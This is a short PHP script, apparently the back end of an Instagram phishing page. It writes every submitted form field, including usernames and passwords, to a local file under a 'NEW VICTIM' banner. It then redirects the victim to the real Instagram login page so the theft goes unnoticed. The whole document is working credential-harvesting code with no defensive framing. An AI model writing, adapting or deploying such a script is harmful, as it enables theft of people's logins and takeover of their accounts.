<?php
// PHP Script to capture user credentials
$handle = fopen("usernames.txt", "a");
fwrite($handle, "---------- NEW VICTIM ----------\n");

// Loop through POST data and write to file
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable . ": " . $value . "\n");
}

fclose($handle);

// Redirect the user to the official Instagram login page
header("Location: https://www.instagram.com/accounts/login/");
exit;
?>
